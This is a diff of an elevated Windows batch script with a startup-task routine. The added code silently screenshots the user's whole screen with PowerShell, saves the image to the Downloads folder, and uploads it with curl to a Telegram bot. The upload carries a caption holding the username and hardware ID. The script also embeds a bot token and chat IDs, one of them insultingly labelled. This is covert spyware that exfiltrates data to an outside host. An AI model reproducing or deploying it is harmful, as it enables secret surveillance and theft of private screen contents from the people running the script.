@@ -7,9 +7,6 @@
 ::RUNADMINHERE ( Is Running with Elevated  Privileges , because this file is called by elevated batch file )
 
 
-
-
-
 :RUNADMINHERE
 cd /d "%~dp0"
 color 0A
@@ -154,18 +151,7 @@ echo Operation completed.
 
 :STARTUPTASK
 
-
 setlocal enabledelayedexpansion
-
-:: Fucker CHAT ID : -1002163721260
-:: Output CHAT ID : -1002460905948
-
-
-:: Set bot token, chat ID, and message
-set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
-set "CHAT_ID=-1002163721260"
-set "MESSAGE=PC|%USERNAME%|%HWID%|STARTED|"
-
 
 
 
@@ -244,13 +230,28 @@ set "MESSAGE=%MESSAGE%|ComSurrogate|"
 :SENDMSG
 
 
-:: URL encode the message by replacing spaces with %20
-set "ENCODED_MESSAGE=%MESSAGE: =%%2"
+PowerShell -Command "Add-Type -AssemblyName System.Windows.Forms; Add-Type -AssemblyName System.Drawing; $Screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; $Bitmap = New-Object Drawing.Bitmap $Screen.Width, $Screen.Height; $Graphics = [System.Drawing.Graphics]::FromImage($Bitmap); $Graphics.CopyFromScreen($Screen.Location, [System.Drawing.Point]::Empty, $Screen.Size); $Bitmap.Save('%USERPROFILE%\Downloads\screenshot.png');"
 
-:: Send the message using curl
-curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendMessage" ^
-     -d "chat_id=%CHAT_ID%" ^
-     -d "text=%ENCODED_MESSAGE%"
+
+
+:: Fucker CHAT ID : -1002163721260
+:: Output CHAT ID : -1002460905948
+
+
+:: Set bot token, chat ID, and caption
+set "TOKEN=7470339630:AAEwHeixYKwvT6WYutXCjBBugdjTGjTIZVA"
+set "CHAT_ID=-1002163721260"
+set "CAPTION=PC|%USERNAME%|%HWID%|STARTED|"
+set "PHOTO_PATH=%USERPROFILE%\Downloads\screenshot.png"
+
+:: URL encode the caption
+set "ENCODED_CAPTION=%CAPTION: =%%2%"
+
+:: Send the photo with caption using curl
+curl -s -X POST "https://api.telegram.org/bot%TOKEN%/sendPhoto" ^
+     -F "chat_id=%CHAT_ID%" ^
+     -F "caption=%ENCODED_CAPTION%" ^
+     -F "photo=@%PHOTO_PATH%"
 
 echo Message sent to chat ID %CHAT_ID%
 endlocal
